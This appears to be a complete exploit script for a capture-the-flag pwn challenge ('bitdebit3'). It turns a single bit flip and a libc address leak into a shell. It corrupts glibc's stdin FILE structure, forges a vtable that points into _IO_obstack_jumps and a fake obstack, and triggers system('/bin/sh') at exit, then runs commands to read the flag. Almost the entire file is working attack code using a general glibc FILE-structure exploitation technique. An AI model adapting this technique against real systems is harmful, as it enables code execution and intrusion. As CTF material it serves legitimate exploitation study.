#!/usr/bin/env python3
# bitdebit3: one arbitrary bit flip + libc leak -> house of obstack on stdin.
# 1. flip one high bit of _IO_2_1_stdin_._IO_buf_end so the next fgets underflow
#    does read(0, &stdin->_shortbuf, 2**p+1), an unbounded write into libc .data.
# 2. rewrite stdin tail: _mode=1, _wide_data->fake (write_ptr>write_base),
#    vtable=_IO_obstack_jumps, obstack ptr at fp+0xe0 -> fake obstack.
# 3. exit -> _IO_cleanup -> _IO_flush_all_lockp -> _IO_obstack_overflow
#    -> _obstack_newchunk -> CALL_CHUNKFUN -> system("/bin/sh").
import socket, ssl, struct, sys, time, re

STDIN      = 0x21aaa0
BUF_END    = STDIN + 0x40          # 0x21aae0, value = base+0x21ab24
SHORTBUF   = STDIN + 0x83
OBSTACK_JT = 0x2173c0
# vtable shifted so vtable+0x18 lands on the _IO_obstack_xsputn slot (0x2173f8).
# _IO_obstack_overflow has assert(c != EOF) and flush_all always passes EOF, so we
# call xsputn(fp, EOF, rdx) instead: it also reaches _obstack_newchunk -> CALL_CHUNKFUN.
XSPUTN_VT  = 0x2173f8 - 0x18
LOCK       = 0x21ca80
SYSTEM     = 0x50d70
BINSH      = 0x1d8678

p64 = lambda x: struct.pack('<Q', x & (2**64 - 1))


def build_payload(base):
    B = base + STDIN
    wide = B + 0x100
    obst = B + 0x140

    d = bytearray(0x191 - 0x83)          # from fp+0x83 to fp+0x191
    def put(off, data):                  # off is relative to fp
        d[off - 0x83:off - 0x83 + len(data)] = data

    put(0x83, b'\n')                     # _shortbuf: newline ends fgets at once
    put(0x88, p64(base + LOCK))          # _lock
    put(0x90, p64(0))                    # _offset
    put(0x98, p64(0))                    # _codecvt
    put(0xa0, p64(wide))                 # _wide_data
    put(0xc0, struct.pack('<I', 1))      # _mode = 1
    put(0xd8, p64(base + XSPUTN_VT))     # vtable
    put(0xe0, p64(obst))                 # _IO_obstack_file.obstack

    # fake _IO_wide_data at fp+0x100: _IO_write_ptr(+0x20) > _IO_write_base(+0x18)
    put(0x118, p64(0))
    put(0x120, p64(1))

    # fake obstack at fp+0x140
    put(0x140, p64(0))                   # chunk_size
    put(0x148, p64(0))                   # chunk
    put(0x150, p64(0))                   # object_base
    put(0x158, p64(0))                   # next_free
    put(0x160, p64(0))                   # chunk_limit  (room == 0)
    put(0x168, p64(0))                   # temp
    put(0x170, p64(0))                   # alignment_mask
    put(0x178, p64(base + SYSTEM))       # chunkfun.extra
    put(0x180, p64(0))                   # freefun
    put(0x188, p64(base + BINSH))        # extra_arg
    put(0x190, b'\x01')                  # use_extra_arg = 1
    return bytes(d)


def pick_bit(base):
    """smallest global bit index p >= 9 that is 0 in stdin->_IO_buf_end"""
    v = base + STDIN + 0x83 + 1
    for p in range(9, 40):
        if not (v >> p) & 1:
            return p
    raise RuntimeError('no clear bit')


def run(host, port, cmd=b'cat /home/pwn/flag; cat flag; ls -la\n', tls=None):
    # the remote instance sits behind a TLS terminator on <deployment>.challs...:1337
    if tls is None:
        tls = not host.startswith('127.')
    s = socket.create_connection((host, int(port)), timeout=20)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(20)
    f = s.makefile('rwb')

    def until(tok):
        buf = b''
        while tok not in buf:
            c = f.read(1)
            if not c:
                raise EOFError(buf)
            buf += c
        return buf

    hdr = until(b'first addr')
    m = re.search(rb'libc base: (0x[0-9a-f]+)', hdr)
    base = int(m.group(1), 16)
    print('[+] libc base', hex(base))

    p = pick_bit(base)
    addr = base + BUF_END + p // 8
    bit = p % 8
    print('[+] flip bit %d of %#x (global bit %d, delta %#x)' % (bit, addr, p, 1 << p))

    f.write(b'%d\n' % addr); f.flush()
    until(b'first bit')
    f.write(b'%d\n' % bit); f.flush()
    until(b'I didnt get it')

    time.sleep(0.3)
    s.sendall(build_payload(base))
    time.sleep(0.6)
    s.sendall(cmd)

    s.settimeout(6)
    out = b''
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    print(out.decode('latin1'))
    m = re.search(rb'TFCCTF\{[^}]*\}', out)
    if m:
        print('FLAG', m.group(0).decode())
    return out


if __name__ == '__main__':
    run(sys.argv[1], sys.argv[2])
